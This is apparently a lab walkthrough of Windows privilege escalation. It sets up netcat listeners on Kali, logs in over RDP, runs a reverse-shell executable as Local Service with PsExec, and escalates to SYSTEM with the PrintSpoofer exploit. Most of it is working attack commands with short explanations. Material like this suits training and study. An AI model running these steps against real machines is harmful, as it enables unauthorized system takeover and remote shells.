
---

### 🔑 **Step 1: Start a Listener on Kali**

You need to start a listener on Kali to receive the reverse shell. Run the following command to listen on a chosen port (e.g., `9999`):

```bash
nc -lvnp 9999
```

- **What it does:** Starts **Netcat** on Kali and listens for incoming connections on port `9999`.
    
- **Why it works:** This is where the reverse shell from the **Local Service** account will connect.
    

---

### 👤 **Step 2: Log into the Target via RDP as Admin**

Log into the target system using **RDP** as the **admin** user.

```bash
rdesktop -u admin -p adminpassword MACHINE_IP
```

- **What it does:** Logs you into the target machine as the **admin** user.
    
- **Why it works:** This step is necessary for performing the actions as **admin** and accessing **elevated privileges**.
    

---

### 🖥️ **Step 3: Start an Elevated Command Prompt**

Once logged into the target system, **right-click** on **Command Prompt** and select **Run as Administrator** to open an elevated command prompt.

---

### 🖱️ **Step 4: Use PSExec64.exe to Run the Reverse Shell**

In the elevated command prompt, use **PSExec64.exe** to run your **reverse.exe** executable as the **Local Service** account. Here's the command:

```cmd
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

- **What it does:**
    
    - `-i`: Runs the program interactively, so the reverse shell will show up in the current session.
        
    - `-u "nt authority\local service"`: Runs the command as the **Local Service** account.
        
    - `C:\PrivEsc\reverse.exe`: Executes the reverse shell executable you created earlier.
        
- **Why it works:** The reverse shell will be executed under the **Local Service** account, which has limited privileges.
    

---

### 🎧 **Step 5: Start Another Listener on Kali**

Set up another listener on Kali to catch the reverse shell from the **Local Service** account. You can use the same port as before (e.g., `9999`):

```bash
nc -lvnp 9999
```

- **What it does:** Listens for incoming connections from the reverse shell triggered in the previous step.
    
- **Why it works:** This listener will catch the connection from the **Local Service** reverse shell.
    

---

### 💥 **Step 6: Run the PrintSpoofer Exploit**

Now, with the reverse shell running under **Local Service** privileges, you can use the **PrintSpoofer** exploit to escalate privileges to **SYSTEM**. Run the following command inside the reverse shell:

```cmd
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

- **What it does:**
    
    - `-c "C:\PrivEsc\reverse.exe"`: Specifies the path to the reverse shell executable you want to run after exploiting **PrintSpoofer**.
        
    - `-i`: Runs the exploit interactively to escalate privileges to **SYSTEM**.
        
- **Why it works:** **PrintSpoofer** exploits the way Windows handles print spooling, allowing you to trigger a **reverse shell** running with **SYSTEM** privileges.
    

---
